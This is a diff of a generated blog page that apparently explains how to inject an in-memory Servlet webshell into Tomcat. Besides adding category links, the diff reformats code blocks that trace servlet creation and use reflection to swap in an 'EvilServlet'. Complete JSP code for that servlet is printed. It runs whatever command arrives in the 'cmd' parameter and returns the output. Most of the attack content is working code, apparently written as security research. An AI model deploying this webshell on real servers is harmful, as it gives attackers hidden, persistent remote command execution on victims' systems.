@@ -88,6 +88,10 @@
           <a href="/archives/">Archives</a>
         </li>
       
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
         <li class="nav-item" data-path="/tags/">
           <a href="/tags/">Tags</a>
         </li>
@@ -162,6 +166,23 @@
           2022-06-09 09:43:07
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/" title="Web Security">
+                    <b>#</b> Web Security
+                  </a>
+                </span>
+                
+                <span class="span--category">
+                  <a href="/categories/Web-Security/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">
+                    <b>#</b> Java内存马
+                  </a>
+                </span>
+                
+              </span>
+          
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
@@ -193,15 +214,15 @@
 <h1 id="探究Servlet的创建流程"><a href="#探究Servlet的创建流程" class="headerlink" title="探究Servlet的创建流程"></a>探究Servlet的创建流程</h1><p>同样是创建一个HomeServlet，并将Class的开头与doGet()的地方打上断点</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134250716.png" alt="image-20211230134250716"></p>
 <p>同时在web.xml中添加上</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>HomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>HomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>HomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="xml">    &lt;servlet&gt;
+        &lt;servlet-name&gt;HomeServlet&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;HomeServlet&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;HomeServlet&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/home&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+</code></pre>
 <p>运行服务器后发现 第一个断点会在访问<code>/home</code>后断下，因此我们断点，servlet是在server收到请求后创建的。</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134515772.png" alt="image-20211230134515772"></p>
 <p>在<code>StandardWrapper</code>中，loadServlet()方法中创建了一个servlet</p>
@@ -212,91 +233,89 @@
 <p><code>StandardWrapper</code>继承了<code>ServletConfig</code>，而<code>ServletConfig</code>是可以直接被我们所获取得，其保存了当前Servlet的配置信息。</p>
 <p>因此我们可以直接在jsp中进行获取。</p>
 <p>需要注意的是，jsp中获取到的作用域都是<code>Facade</code>类型(如果直接写成StandardWrapperFacade类型会报错)</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">StandardWrapperFacade</span> stdWrapperFacade <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardWrapperFacade</span><span class="token punctuation">)</span> config<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code class="java">  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
+</code></pre>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135326053.png" alt="image-20211230135326053"></p>
 <p>可以发现在构造方法中，StandardWrapper类型的context被赋值给了类属性<code>context</code></p>
 <p>因此我们可以用反射的方法来获取到context</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">StandardWrapperFacade</span> stdWrapperFacade <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardWrapperFacade</span><span class="token punctuation">)</span> config<span class="token punctuation">;</span>
-<span class="token class-name">Field</span> stdWrapperField <span class="token operator">=</span> stdWrapperFacade<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-stdWrapperField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">StandardWrapper</span> stdWrapper <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardWrapper</span><span class="token punctuation">)</span> stdWrapperField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>stdWrapperFacade<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="java">  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
+  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
+  stdWrapperField.setAccessible(true);
+  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
+</code></pre>
 <p>获取到standardWrapper后，就可以设置相应的servlet了</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java">stdWrapper<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EvilServlet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code class="java">stdWrapper.setServlet(new EvilServlet());
+</code></pre>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135525495.png" alt="image-20211230135525495"></p>
 <p>因此完整的注册内存马代码如下</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>
-  <span class="token class-name">StandardWrapperFacade</span> stdWrapperFacade <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardWrapperFacade</span><span class="token punctuation">)</span> config<span class="token punctuation">;</span>
-  <span class="token class-name">Field</span> stdWrapperField <span class="token operator">=</span> stdWrapperFacade<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  stdWrapperField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token class-name">StandardWrapper</span> stdWrapper <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardWrapper</span><span class="token punctuation">)</span> stdWrapperField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>stdWrapperFacade<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  stdWrapper<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EvilServlet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="java">&lt;%
+  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
+  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
+  stdWrapperField.setAccessible(true);
+  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
+  stdWrapper.setServlet(new EvilServlet());
+%&gt;
+</code></pre>
+<h1 id="构造Servlet内存马恶意代码的构造"><a href="#构造Servlet内存马恶意代码的构造" class="headerlink" title="构造Servlet内存马恶意代码的构造"></a>构造Servlet内存马恶意代码的构造</h1><pre><code class="java">  public class EvilServlet extends javax.servlet.http.HttpServlet&#123;
+    @Override
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+      super.doPost(req, resp);
+    &#125;
 
-<h1 id="构造Servlet内存马恶意代码的构造"><a href="#构造Servlet内存马恶意代码的构造" class="headerlink" title="构造Servlet内存马恶意代码的构造"></a>构造Servlet内存马恶意代码的构造</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilServlet</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span>HttpServlet</span><span class="token punctuation">&#123;</span>
-  <span class="token annotation punctuation">@Override</span>
-  <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+      String cmd = req.getParameter(&quot;cmd&quot;);
+      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+      int i=0;
+      byte[] bytes=new byte[1024];
+      while ((i=inputStream.read(bytes))!=-1)&#123;
+        resp.getWriter().write(new String(bytes,0,i));
+        resp.getWriter().write(&quot;\r\n&quot;);
+      &#125;
+    &#125;
+  &#125;
+</code></pre>
+<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapperFacade&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%--
+  Created by IntelliJ IDEA.
+  User: leihehe
+  Date: 30/12/2021
+  Time: 09:22
+  To change this template use File | Settings | File Templates.
+--%&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
+  public class EvilServlet extends javax.servlet.http.HttpServlet&#123;
+    @Override
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+      super.doPost(req, resp);
+    &#125;
 
-  <span class="token annotation punctuation">@Override</span>
-  <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
-    <span class="token class-name">String</span> cmd <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">=</span>inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-      resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-      resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+      String cmd = req.getParameter(&quot;cmd&quot;);
+      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+      int i=0;
+      byte[] bytes=new byte[1024];
+      while ((i=inputStream.read(bytes))!=-1)&#123;
+        resp.getWriter().write(new String(bytes,0,i));
+        resp.getWriter().write(&quot;\r\n&quot;);
+      &#125;
+    &#125;
+  &#125;
+%&gt;
 
-<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardWrapper"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardWrapperFacade"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">--</span>
-  <span class="token class-name">Created</span> by <span class="token class-name">IntelliJ</span> <span class="token class-name">IDEA<span class="token punctuation">.</span>
-  User</span><span class="token operator">:</span> leihehe
-  <span class="token class-name">Date</span><span class="token operator">:</span> <span class="token number">30</span><span class="token operator">/</span><span class="token number">12</span><span class="token operator">/</span><span class="token number">2021</span>
-  <span class="token class-name">Time</span><span class="token operator">:</span> <span class="token number">09</span><span class="token operator">:</span><span class="token number">22</span>
-  <span class="token class-name">To</span> change <span class="token keyword">this</span> template use <span class="token class-name">File</span> <span class="token operator">|</span> <span class="token class-name">Settings</span> <span class="token operator">|</span> <span class="token class-name">File</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span>
-<span class="token operator">--</span><span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>
-  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilServlet</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span>HttpServlet</span><span class="token punctuation">&#123;</span>
-    <span class="token annotation punctuation">@Override</span>
-    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
-      <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token annotation punctuation">@Override</span>
-    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
-      <span class="token class-name">String</span> cmd <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
-      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">=</span>inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span>
-<span class="token operator">%</span><span class="token operator">></span>
-
-<span class="token operator">&lt;</span><span class="token operator">%</span>
-  <span class="token class-name">StandardWrapperFacade</span> stdWrapperFacade <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardWrapperFacade</span><span class="token punctuation">)</span> config<span class="token punctuation">;</span>
-  <span class="token class-name">Field</span> stdWrapperField <span class="token operator">=</span> stdWrapperFacade<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  stdWrapperField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token class-name">StandardWrapper</span> stdWrapper <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardWrapper</span><span class="token punctuation">)</span> stdWrapperField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>stdWrapperFacade<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  stdWrapper<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EvilServlet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">%</span><span class="token operator">></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+&lt;%
+  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
+  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
+  stdWrapperField.setAccessible(true);
+  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
+  stdWrapper.setServlet(new EvilServlet());
+%&gt;
+</code></pre>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230140132389.png" alt="image-20211230140132389"></p>
 
       </div>
@@ -316,6 +335,23 @@ stdWrapperField<span class="token punctuation">.</span><span class="token functi
               2022-06-09 09:43:07
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/" title="Web Security">
+                        <b>#</b> Web Security
+                      </a>
+                    </span>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">
+                        <b>#</b> Java内存马
+                      </a>
+                    </span>
+                    
+                  </span>
+              
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
